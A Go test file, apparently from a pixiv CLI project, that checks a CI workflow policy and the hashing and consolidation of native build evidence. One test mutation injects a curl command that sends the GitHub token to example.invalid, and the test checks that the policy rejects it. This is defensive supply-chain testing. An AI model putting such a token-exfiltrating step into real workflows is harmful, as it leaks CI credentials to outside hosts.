package main

import (
	"archive/tar"
	"archive/zip"
	"compress/gzip"
	"encoding/json"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"sort"
	"strings"
	"testing"

	"github.com/FlanChanXwO/pixiv-cli/internal/download"
	"gopkg.in/yaml.v3"
)

const testEvidenceCommit = "0123456789abcdef0123456789abcdef01234567"

func TestMain(m *testing.M) {
	if len(os.Args) == 3 && os.Args[1] == "version" && os.Args[2] == "--json" {
		_, _ = os.Stdout.WriteString(`{"version":"v0.1.0-native-evidence.test","commit":"fixture-commit","build_date":"2026-07-12T00:00:00Z"}` + "\n")
		os.Exit(0)
	}
	os.Exit(m.Run())
}

func TestCheckWorkflowAcceptsAuditedNativeEvidenceEntry(t *testing.T) {
	t.Parallel()

	body, err := os.ReadFile(filepath.Join(findRepositoryRoot(t), ".github", "workflows", "native-evidence.yml"))
	if err != nil {
		t.Fatalf("read native evidence workflow: %v", err)
	}
	if err := checkWorkflow(body); err != nil {
		t.Fatalf("native evidence policy rejected an audited non-release fixture: %v", err)
	}
}

func TestCheckWorkflowRejectsNativeEvidenceSecurityAndCompletenessMutations(t *testing.T) {
	for _, test := range []struct {
		name   string
		mutate func(t *testing.T, root *yaml.Node)
	}{
		{
			name: "tag trigger",
			mutate: func(t *testing.T, root *yaml.Node) {
				push := requireMappingValue(t, requireMappingValue(t, root, "on"), "push")
				appendMappingValue(t, push, "tags", sequenceNode("v*"))
			},
		},
		{
			name: "secret reference",
			mutate: func(t *testing.T, root *yaml.Node) {
				appendMappingValue(t, requireJob(t, root), "env", mappingNode("UNSAFE", scalarNode("${{ secrets.RELEASE_SIGNING_PRIVATE_KEY }}")))
			},
		},
		{
			name: "release environment",
			mutate: func(t *testing.T, root *yaml.Node) {
				appendMappingValue(t, requireJob(t, root), "environment", scalarNode("release"))
			},
		},
		{
			name: "permission expansion",
			mutate: func(t *testing.T, root *yaml.Node) {
				requireMappingValue(t, requireJob(t, root), "permissions").Content[1].Value = "write"
			},
		},
		{
			name: "mutable action",
			mutate: func(t *testing.T, root *yaml.Node) {
				requireMappingValue(t, requireJobSteps(t, root).Content[0], "uses").Value = "actions/checkout@v4"
			},
		},
		{
			name: "release command",
			mutate: func(t *testing.T, root *yaml.Node) {
				requireJobSteps(t, root).Content = append(requireJobSteps(t, root).Content, mappingNode("name", scalarNode("Publish"), "shell", scalarNode("bash"), "run", scalarNode("gh release create v0.1.0")))
			},
		},
		{
			name: "github token curl injection",
			mutate: func(t *testing.T, root *yaml.Node) {
				run := requireMappingValue(t, requireJobSteps(t, root).Content[8], "run")
				run.Value += "curl -H 'Authorization: Bearer ${{ github.token }}' https://example.invalid\n"
			},
		},
		{
			name: "unrestricted dispatch ref",
			mutate: func(t *testing.T, root *yaml.Node) {
				requireMappingValue(t, requireJobSteps(t, root).Content[3], "run").Value = "true"
			},
		},
		{
			name: "missing native smoke",
			mutate: func(t *testing.T, root *yaml.Node) {
				removeStepNamed(t, requireJobSteps(t, root), "Run native GIF/APNG smoke")
			},
		},
		{
			name: "missing evidence upload",
			mutate: func(t *testing.T, root *yaml.Node) {
				removeStepNamed(t, requireJobSteps(t, root), "Upload native evidence")
			},
		},
		{
			name: "missing windows arm target",
			mutate: func(t *testing.T, root *yaml.Node) {
				include := requireMappingValue(t, requireMappingValue(t, requireJob(t, root), "strategy"), "matrix")
				include = requireMappingValue(t, include, "include")
				include.Content = include.Content[:len(include.Content)-1]
			},
		},
	} {
		t.Run(test.name, func(t *testing.T) {
			root := checkedInWorkflowRoot(t)
			test.mutate(t, root)
			body, err := yaml.Marshal(root)
			if err != nil {
				t.Fatalf("marshal mutated workflow: %v", err)
			}
			if err := checkWorkflow(body); err == nil {
				t.Fatal("native evidence policy accepted a security or completeness mutation")
			}
		})
	}
}

func TestRecordEvidenceBindsStaticlibBinaryAndCompleteArchive(t *testing.T) {
	repoRoot := findRepositoryRoot(t)
	workDir, err := os.MkdirTemp(repoRoot, ".native-evidence-test.")
	if err != nil {
		t.Fatalf("create repository-local work directory: %v", err)
	}
	t.Cleanup(func() {
		if err := os.RemoveAll(workDir); err != nil {
			t.Errorf("remove work directory: %v", err)
		}
	})
	staticlib := filepath.Join(workDir, "libugoira_rs.a")
	if err := os.WriteFile(staticlib, []byte("fixture native staticlib"), 0o644); err != nil {
		t.Fatalf("write staticlib: %v", err)
	}
	binaryName := "pixiv"
	if runtime.GOOS == "windows" {
		binaryName = "pixiv.exe"
	}
	binary := filepath.Join(workDir, binaryName)
	copyTestExecutable(t, binary)
	archive := filepath.Join(workDir, "pixiv-cli_0.1.0-native-evidence.test_linux_amd64.tar.gz")
	packageReleaseArchive(t, repoRoot, binary, workDir)
	output := filepath.Join(workDir, "native-evidence.json")

	record, err := recordEvidence(recordOptions{
		repoRoot:   repoRoot,
		version:    "0.1.0-native-evidence.test",
		target:     "linux/amd64",
		rustTarget: "x86_64-unknown-linux-gnu",
		staticlib:  staticlib,
		binary:     binary,
		archive:    archive,
		output:     output,
	})
	if err != nil {
		t.Fatalf("record native evidence: %v", err)
	}
	if record.Binary.Version != "v0.1.0-native-evidence.test" {
		t.Fatalf("binary version = %q", record.Binary.Version)
	}
	if len(record.Archive.Members) < 4 {
		t.Fatalf("archive member count = %d, want binary and complete licenses", len(record.Archive.Members))
	}
	body, err := os.ReadFile(output)
	if err != nil {
		t.Fatalf("read evidence record: %v", err)
	}
	var decoded evidenceRecord
	if err := json.Unmarshal(body, &decoded); err != nil {
		t.Fatalf("decode written evidence: %v", err)
	}
	if decoded.Staticlib.SHA256 != record.Staticlib.SHA256 || decoded.SourceDigest != record.SourceDigest {
		t.Fatalf("written evidence did not preserve verified hashes")
	}
}

func TestConsolidateEvidencePublishesOnlyCompleteSameSourceStaticlibs(t *testing.T) {
	workDir := newRepositoryWorkDir(t)
	inputDir := filepath.Join(workDir, "evidence")
	if err := os.Mkdir(inputDir, 0o755); err != nil {
		t.Fatalf("create evidence directory: %v", err)
	}
	sourceDigest := testSourceDigest(t)
	for platform, target := range nativeTargets {
		writeConsolidationFixture(t, inputDir, platform, target, sourceDigest)
	}
	outputDir := filepath.Join(workDir, "staticlib")
	if err := consolidateEvidence(consolidateOptions{repoRoot: findRepositoryRoot(t), expectedVersion: "v0.1.0-native-evidence.test", expectedCommit: testEvidenceCommit, inputDir: inputDir, outputDir: outputDir}); err != nil {
		t.Fatalf("consolidate six native records: %v", err)
	}
	manifest, err := os.ReadFile(filepath.Join(outputDir, "manifest.json"))
	if err != nil {
		t.Fatalf("read consolidated manifest: %v", err)
	}
	if err := download.ValidateUgoiraStaticlibManifestFiles(outputDir, manifest, sourceDigest); err != nil {
		t.Fatalf("validate consolidated staticlib manifest: %v", err)
	}
}

func TestConsolidateEvidenceRejectsMissingTargetWithoutPublishingOutput(t *testing.T) {
	workDir := newRepositoryWorkDir(t)
	inputDir := filepath.Join(workDir, "evidence")
	if err := os.Mkdir(inputDir, 0o755); err != nil {
		t.Fatalf("create evidence directory: %v", err)
	}
	sourceDigest := testSourceDigest(t)
	for platform, target := range nativeTargets {
		if platform == "windows/arm64" {
			continue
		}
		writeConsolidationFixture(t, inputDir, platform, target, sourceDigest)
	}
	outputDir := filepath.Join(workDir, "staticlib")
	err := consolidateEvidence(consolidateOptions{repoRoot: findRepositoryRoot(t), expectedVersion: "v0.1.0-native-evidence.test", expectedCommit: testEvidenceCommit, inputDir: inputDir, outputDir: outputDir})
	if err == nil || !strings.Contains(err.Error(), "six") {
		t.Fatalf("consolidate error = %v, want missing-target rejection", err)
	}
	if _, statErr := os.Lstat(outputDir); !os.IsNotExist(statErr) {
		t.Fatalf("failed consolidation published partial output: %v", statErr)
	}
}

func TestConsolidateEvidenceRejectsArchiveMemberHashMismatch(t *testing.T) {
	workDir := newRepositoryWorkDir(t)
	inputDir := filepath.Join(workDir, "evidence")
	if err := os.Mkdir(inputDir, 0o755); err != nil {
		t.Fatalf("create evidence directory: %v", err)
	}
	sourceDigest := testSourceDigest(t)
	for platform, target := range nativeTargets {
		writeConsolidationFixture(t, inputDir, platform, target, sourceDigest)
	}
	recordPath := filepath.Join(inputDir, "linux-amd64", "native-evidence.json")
	body, err := os.ReadFile(recordPath)
	if err != nil {
		t.Fatalf("read fixture evidence: %v", err)
	}
	var record evidenceRecord
	if err := json.Unmarshal(body, &record); err != nil {
		t.Fatalf("decode fixture evidence: %v", err)
	}
	record.Archive.Members[0].SHA256 = strings.Repeat("e", 64)
	body, err = json.Marshal(record)
	if err != nil {
		t.Fatalf("encode mismatched evidence: %v", err)
	}
	if err := os.WriteFile(recordPath, body, 0o644); err != nil {
		t.Fatalf("write mismatched evidence: %v", err)
	}
	outputDir := filepath.Join(workDir, "staticlib")
	err = consolidateEvidence(consolidateOptions{repoRoot: findRepositoryRoot(t), expectedVersion: "v0.1.0-native-evidence.test", expectedCommit: testEvidenceCommit, inputDir: inputDir, outputDir: outputDir})
	if err == nil || !strings.Contains(err.Error(), "members") {
		t.Fatalf("consolidate error = %v, want archive-member mismatch rejection", err)
	}
	if _, statErr := os.Lstat(outputDir); !os.IsNotExist(statErr) {
		t.Fatalf("failed consolidation published output: %v", statErr)
	}
}

func TestConsolidateEvidenceRejectsMixedBuildMetadataWithoutPublishingOutput(t *testing.T) {
	for _, mutation := range []struct {
		name  string
		apply func(*evidenceRecord)
	}{
		{name: "commit", apply: func(record *evidenceRecord) { record.Binary.Commit = "other-main-sha" }},
		{name: "version", apply: func(record *evidenceRecord) { record.Binary.Version = "v0.1.0-native-evidence.other" }},
	} {
		t.Run(mutation.name, func(t *testing.T) {
			workDir := newRepositoryWorkDir(t)
			inputDir := filepath.Join(workDir, "evidence")
			if err := os.Mkdir(inputDir, 0o755); err != nil {
				t.Fatalf("create evidence directory: %v", err)
			}
			for platform, target := range nativeTargets {
				writeConsolidationFixture(t, inputDir, platform, target, testSourceDigest(t))
			}
			recordPath := filepath.Join(inputDir, "linux-amd64", "native-evidence.json")
			body, err := os.ReadFile(recordPath)
			if err != nil {
				t.Fatalf("read fixture evidence: %v", err)
			}
			var record evidenceRecord
			if err := json.Unmarshal(body, &record); err != nil {
				t.Fatalf("decode fixture evidence: %v", err)
			}
			mutation.apply(&record)
			body, err = json.Marshal(record)
			if err != nil {
				t.Fatalf("encode mixed evidence: %v", err)
			}
			if err := os.WriteFile(recordPath, body, 0o644); err != nil {
				t.Fatalf("write mixed evidence: %v", err)
			}
			outputDir := filepath.Join(workDir, "staticlib")
			err = consolidateEvidence(consolidateOptions{repoRoot: findRepositoryRoot(t), expectedVersion: "v0.1.0-native-evidence.test", expectedCommit: testEvidenceCommit, inputDir: inputDir, outputDir: outputDir})
			if err == nil || !strings.Contains(err.Error(), "metadata") {
				t.Fatalf("consolidate error = %v, want metadata rejection", err)
			}
			if _, statErr := os.Lstat(outputDir); !os.IsNotExist(statErr) {
				t.Fatalf("failed consolidation published output: %v", statErr)
			}
		})
	}
}

func TestConsolidateEvidenceRejectsMalformedExpectedCommitBeforeInput(t *testing.T) {
	for _, commit := range []string{"", "abc", strings.Repeat("a", 39), strings.Repeat("a", 41), strings.Repeat("A", 40), strings.Repeat("g", 40), " " + strings.Repeat("a", 40)} {
		t.Run("commit="+commit, func(t *testing.T) {
			workDir := newRepositoryWorkDir(t)
			outputDir := filepath.Join(workDir, "staticlib")
			err := consolidateEvidence(consolidateOptions{
				repoRoot:        findRepositoryRoot(t),
				expectedVersion: "v0.1.0-native-evidence.test",
				expectedCommit:  commit,
				inputDir:        filepath.Join(workDir, "missing-input"),
				outputDir:       outputDir,
			})
			if err == nil || !strings.Contains(err.Error(), "expected commit") {
				t.Fatalf("consolidate error = %v, want malformed-commit rejection", err)
			}
			if _, statErr := os.Lstat(outputDir); !os.IsNotExist(statErr) {
				t.Fatalf("malformed commit published output: %v", statErr)
			}
		})
	}
}

func TestConsolidateEvidenceRejectsArchiveMissingRequiredMember(t *testing.T) {
	for _, missing := range []string{"pixiv", "LICENSE"} {
		t.Run(missing, func(t *testing.T) {
			workDir := newRepositoryWorkDir(t)
			inputDir := filepath.Join(workDir, "evidence")
			if err := os.Mkdir(inputDir, 0o755); err != nil {
				t.Fatalf("create evidence directory: %v", err)
			}
			sourceDigest := testSourceDigest(t)
			for platform, target := range nativeTargets {
				writeConsolidationFixture(t, inputDir, platform, target, sourceDigest)
			}
			recordPath := filepath.Join(inputDir, "linux-amd64", "native-evidence.json")
			body, err := os.ReadFile(recordPath)
			if err != nil {
				t.Fatalf("read fixture evidence: %v", err)
			}
			var record evidenceRecord
			if err := json.Unmarshal(body, &record); err != nil {
				t.Fatalf("decode fixture evidence: %v", err)
			}
			filtered := record.Archive.Members[:0]
			for _, member := range record.Archive.Members {
				if member.Name != missing {
					filtered = append(filtered, member)
				}
			}
			record.Archive.Members = filtered
			body, err = json.Marshal(record)
			if err != nil {
				t.Fatalf("encode incomplete evidence: %v", err)
			}
			if err := os.WriteFile(recordPath, body, 0o644); err != nil {
				t.Fatalf("write incomplete evidence: %v", err)
			}
			outputDir := filepath.Join(workDir, "staticlib")
			err = consolidateEvidence(consolidateOptions{repoRoot: findRepositoryRoot(t), expectedVersion: "v0.1.0-native-evidence.test", expectedCommit: testEvidenceCommit, inputDir: inputDir, outputDir: outputDir})
			if err == nil || !strings.Contains(err.Error(), "members") {
				t.Fatalf("consolidate error = %v, want incomplete archive rejection", err)
			}
			if _, statErr := os.Lstat(outputDir); !os.IsNotExist(statErr) {
				t.Fatalf("failed consolidation published output: %v", statErr)
			}
		})
	}
}

func TestConsolidateEvidenceRejectsSymlinkInputAncestor(t *testing.T) {
	workDir := newRepositoryWorkDir(t)
	actualInput := filepath.Join(workDir, "actual-input")
	if err := os.Mkdir(actualInput, 0o755); err != nil {
		t.Fatalf("create input: %v", err)
	}
	linkedInput := filepath.Join(workDir, "linked-input")
	if err := os.Symlink(actualInput, linkedInput); err != nil {
		t.Fatalf("create input symlink: %v", err)
	}
	err := consolidateEvidence(consolidateOptions{repoRoot: findRepositoryRoot(t), expectedVersion: "v0.1.0-native-evidence.test", expectedCommit: testEvidenceCommit, inputDir: linkedInput, outputDir: filepath.Join(workDir, "output")})
	if err == nil || !strings.Contains(err.Error(), "symlink ancestor") {
		t.Fatalf("consolidate error = %v, want input symlink rejection", err)
	}
}

func writeConsolidationFixture(t *testing.T, inputDir, platform string, target nativeTarget, sourceDigest string) {
	t.Helper()
	directory := filepath.Join(inputDir, strings.ReplaceAll(platform, "/", "-"))
	if err := os.Mkdir(directory, 0o755); err != nil {
		t.Fatalf("create fixture directory: %v", err)
	}
	staticlibBody := []byte("staticlib for " + platform)
	staticlibPath := filepath.Join(directory, target.staticlib)
	if err := os.WriteFile(staticlibPath, staticlibBody, 0o644); err != nil {
		t.Fatalf("write staticlib fixture: %v", err)
	}
	binaryName := "pixiv"
	if target.goos == "windows" {
		binaryName = "pixiv.exe"
	}
	binaryPath := filepath.Join(directory, binaryName)
	archivePath := filepath.Join(directory, expectedArchiveName("0.1.0-native-evidence.test", target))
	if err := os.WriteFile(binaryPath, []byte("binary for "+platform), 0o755); err != nil {
		t.Fatalf("write binary fixture: %v", err)
	}
	staticlibDigest, err := fileSHA256(staticlibPath)
	if err != nil {
		t.Fatalf("hash staticlib fixture: %v", err)
	}
	binaryDigest, err := fileSHA256(binaryPath)
	if err != nil {
		t.Fatalf("hash binary fixture: %v", err)
	}
	members := packageConsolidationArchive(t, findRepositoryRoot(t), binaryPath, archivePath, target.goos == "windows", binaryName, binaryDigest)
	archiveDigest, err := fileSHA256(archivePath)
	if err != nil {
		t.Fatalf("hash archive fixture: %v", err)
	}
	record := evidenceRecord{
		Schema:       1,
		Target:       evidenceTarget{GOOS: target.goos, GOARCH: target.goarch, RustTarget: target.rustTarget},
		SourceDigest: sourceDigest,
		Staticlib:    evidenceFile{Name: target.staticlib, SHA256: staticlibDigest},
		Binary:       evidenceBinary{evidenceFile: evidenceFile{Name: binaryName, SHA256: binaryDigest}, Version: "v0.1.0-native-evidence.test", Commit: testEvidenceCommit, BuildDate: "2026-07-12T00:00:00Z"},
		Archive:      evidenceArchive{evidenceFile: evidenceFile{Name: filepath.Base(archivePath), SHA256: archiveDigest}, Members: members},
	}
	body, err := json.Marshal(record)
	if err != nil {
		t.Fatalf("encode fixture record: %v", err)
	}
	if err := os.WriteFile(filepath.Join(directory, "native-evidence.json"), body, 0o644); err != nil {
		t.Fatalf("write fixture record: %v", err)
	}
}

func packageConsolidationArchive(t *testing.T, repoRoot, binary, archive string, zipFormat bool, binaryName, binaryDigest string) []evidenceFile {
	t.Helper()
	format := "tar.gz"
	if zipFormat {
		format = "zip"
	}
	command := exec.Command("sh", filepath.Join(repoRoot, "scripts", "package-release.sh"), "--binary", binary, "--format", format, "--output", archive)
	command.Dir = repoRoot
	if body, err := command.CombinedOutput(); err != nil {
		t.Fatalf("package consolidation archive: %v\n%s", err, body)
	}
	expected, err := expectedArchiveMembers(repoRoot, binaryName, binaryDigest)
	if err != nil {
		t.Fatalf("calculate expected archive members: %v", err)
	}
	members := make([]evidenceFile, 0, len(expected))
	for name, digest := range expected {
		members = append(members, evidenceFile{Name: name, SHA256: digest})
	}
	sort.Slice(members, func(left, right int) bool { return members[left].Name < members[right].Name })
	return members
}

func testSourceDigest(t *testing.T) string {
	t.Helper()
	digest, err := calculateSourceDigest(findRepositoryRoot(t))
	if err != nil {
		t.Fatalf("calculate test source digest: %v", err)
	}
	return digest
}

func writeMinimalEvidenceArchive(t *testing.T, path string, zipFormat bool) []evidenceFile {
	t.Helper()
	const name = "LICENSE"
	body := []byte("fixture license")
	if zipFormat {
		file, err := os.OpenFile(path, os.O_WRONLY|os.O_CREATE|os.O_EXCL, 0o644)
		if err != nil {
			t.Fatalf("create zip fixture: %v", err)
		}
		writer := zip.NewWriter(file)
		member, err := writer.Create(name)
		if err != nil {
			t.Fatalf("create zip member: %v", err)
		}
		if _, err := member.Write(body); err != nil {
			t.Fatalf("write zip member: %v", err)
		}
		if err := writer.Close(); err != nil {
			t.Fatalf("close zip fixture: %v", err)
		}
		if err := file.Close(); err != nil {
			t.Fatalf("close zip fixture: %v", err)
		}
	} else {
		file, err := os.OpenFile(path, os.O_WRONLY|os.O_CREATE|os.O_EXCL, 0o644)
		if err != nil {
			t.Fatalf("create tar fixture: %v", err)
		}
		gzipWriter := gzip.NewWriter(file)
		writer := tar.NewWriter(gzipWriter)
		if err := writer.WriteHeader(&tar.Header{Name: name, Mode: 0o644, Size: int64(len(body))}); err != nil {
			t.Fatalf("write tar header: %v", err)
		}
		if _, err := writer.Write(body); err != nil {
			t.Fatalf("write tar body: %v", err)
		}
		if err := writer.Close(); err != nil {
			t.Fatalf("close tar fixture: %v", err)
		}
		if err := gzipWriter.Close(); err != nil {
			t.Fatalf("close gzip fixture: %v", err)
		}
		if err := file.Close(); err != nil {
			t.Fatalf("close tar fixture: %v", err)
		}
	}
	digest := sha256Sum(t, body)
	return []evidenceFile{{Name: name, SHA256: digest}}
}

func sha256Sum(t *testing.T, body []byte) string {
	t.Helper()
	path := filepath.Join(newRepositoryWorkDir(t), "hash-input")
	if err := os.WriteFile(path, body, 0o644); err != nil {
		t.Fatalf("write hash input: %v", err)
	}
	digest, err := fileSHA256(path)
	if err != nil {
		t.Fatalf("hash fixture body: %v", err)
	}
	return digest
}

func newRepositoryWorkDir(t *testing.T) string {
	t.Helper()
	directory, err := os.MkdirTemp(findRepositoryRoot(t), ".native-evidence-test.")
	if err != nil {
		t.Fatalf("create repository-local work directory: %v", err)
	}
	t.Cleanup(func() {
		if err := os.RemoveAll(directory); err != nil {
			t.Errorf("remove work directory: %v", err)
		}
	})
	return directory
}

func checkedInWorkflowRoot(t *testing.T) *yaml.Node {
	t.Helper()
	body, err := os.ReadFile(filepath.Join(findRepositoryRoot(t), ".github", "workflows", "native-evidence.yml"))
	if err != nil {
		t.Fatalf("read native evidence workflow: %v", err)
	}
	var document yaml.Node
	if err := yaml.Unmarshal(body, &document); err != nil {
		t.Fatalf("parse native evidence workflow: %v", err)
	}
	if document.Kind != yaml.DocumentNode || len(document.Content) != 1 {
		t.Fatal("native evidence workflow must contain one document")
	}
	return document.Content[0]
}

func requireMappingValue(t *testing.T, mapping *yaml.Node, key string) *yaml.Node {
	t.Helper()
	value, ok := mappingValue(mapping, key)
	if !ok {
		t.Fatalf("missing mapping value %q", key)
	}
	return value
}

func requireJob(t *testing.T, root *yaml.Node) *yaml.Node {
	t.Helper()
	return requireMappingValue(t, requireMappingValue(t, root, "jobs"), "native_evidence")
}

func requireJobSteps(t *testing.T, root *yaml.Node) *yaml.Node {
	t.Helper()
	return requireMappingValue(t, requireJob(t, root), "steps")
}

func appendMappingValue(t *testing.T, mapping *yaml.Node, key string, value *yaml.Node) {
	t.Helper()
	if mapping.Kind != yaml.MappingNode {
		t.Fatalf("append mapping value %q to non-mapping", key)
	}
	mapping.Content = append(mapping.Content, scalarNode(key), value)
}

func removeStepNamed(t *testing.T, steps *yaml.Node, name string) {
	t.Helper()
	for index, step := range steps.Content {
		stepName, ok := mappingValue(step, "name")
		if ok && stepName.Value == name {
			steps.Content = append(steps.Content[:index], steps.Content[index+1:]...)
			return
		}
	}
	t.Fatalf("step %q not found", name)
}

func scalarNode(value string) *yaml.Node {
	return &yaml.Node{Kind: yaml.ScalarNode, Tag: "!!str", Value: value}
}

func sequenceNode(values ...string) *yaml.Node {
	node := &yaml.Node{Kind: yaml.SequenceNode, Tag: "!!seq"}
	for _, value := range values {
		node.Content = append(node.Content, scalarNode(value))
	}
	return node
}

func mappingNode(values ...any) *yaml.Node {
	node := &yaml.Node{Kind: yaml.MappingNode, Tag: "!!map"}
	for index := 0; index < len(values); index += 2 {
		key, ok := values[index].(string)
		if !ok {
			panic("mapping key must be string")
		}
		value, ok := values[index+1].(*yaml.Node)
		if !ok {
			panic("mapping value must be YAML node")
		}
		node.Content = append(node.Content, scalarNode(key), value)
	}
	return node
}

func copyTestExecutable(t *testing.T, output string) {
	t.Helper()
	source, err := os.Open(os.Args[0])
	if err != nil {
		t.Fatalf("open test executable: %v", err)
	}
	defer source.Close()
	destination, err := os.OpenFile(output, os.O_WRONLY|os.O_CREATE|os.O_EXCL, 0o755)
	if err != nil {
		t.Fatalf("create binary fixture: %v", err)
	}
	if _, err := io.Copy(destination, source); err != nil {
		_ = destination.Close()
		t.Fatalf("copy binary fixture: %v", err)
	}
	if err := destination.Close(); err != nil {
		t.Fatalf("close binary fixture: %v", err)
	}
}

func packageReleaseArchive(t *testing.T, repoRoot, binary, outputDir string) {
	t.Helper()
	command := exec.Command("go", "run", "./scripts/releaseassets", "package",
		"--repo-root", repoRoot,
		"--version", "0.1.0-native-evidence.test",
		"--target", "linux/amd64",
		"--binary", binary,
		"--output-dir", outputDir,
	)
	command.Dir = repoRoot
	if body, err := command.CombinedOutput(); err != nil {
		t.Fatalf("package archive for evidence test: %v\n%s", err, body)
	}
}
